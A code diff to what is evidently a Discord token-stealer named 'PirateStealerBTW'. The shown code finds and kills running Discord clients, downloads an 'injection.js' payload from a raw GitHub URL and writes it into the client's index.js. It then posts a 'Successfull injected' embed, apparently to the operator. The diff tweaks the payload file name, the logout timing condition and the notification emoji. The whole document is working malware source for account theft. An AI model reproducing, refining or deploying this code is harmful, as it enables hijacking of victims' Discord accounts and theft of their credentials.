@@ -36,7 +36,7 @@ discords.forEach(function(file) {
 listDiscords();
 
 function Infect() {
-    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injections.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/kyssuuwuas/raar/main/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
@@ -59,10 +59,10 @@ function Infect() {
                     let folder = file.replace("index.js", "PirateStealerBTW")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
-                        if (config.logout == "instant") {
+                        if (config.logout == "delayed") {
                             startDiscord();
                         }
-                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
+                    } else if (fs.existsSync(folder) && config.logout == "delayed" ){
                         startDiscord();
                     }
                 }
@@ -80,7 +80,7 @@ function listDiscords() {
         if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
         if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
-        if (config.logout == "instant") {
+        if (config.logout == "delayed") {
             killDiscord();
         } else {
             if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
@@ -144,7 +144,7 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": "<:8313juganaru2:1091829218356252692> Successfull injected ",
+            "title": "<a:1337:1093566170092810302> Successfull injected <a:1337:1093566170092810302>",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
